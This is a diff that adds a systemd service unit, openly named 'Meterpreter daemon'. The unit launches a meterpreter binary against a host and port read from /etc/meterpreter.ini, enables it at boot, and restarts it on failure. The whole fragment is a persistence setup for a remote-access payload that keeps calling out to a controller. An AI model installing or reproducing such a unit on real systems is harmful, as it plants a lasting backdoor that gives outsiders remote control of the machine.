@@ -1,0 +1,14 @@
+[Unit]
+Description=Meterpreter daemon
+After=network.target
+
+[Service]
+Type=simple
+EnvironmentFile=/etc/meterpreter.ini
+ExecStart=/usr/bin/meterpreter $HOST $PORT
+ExecReload=/bin/kill -HUP $MAINPID
+KillMode=process
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
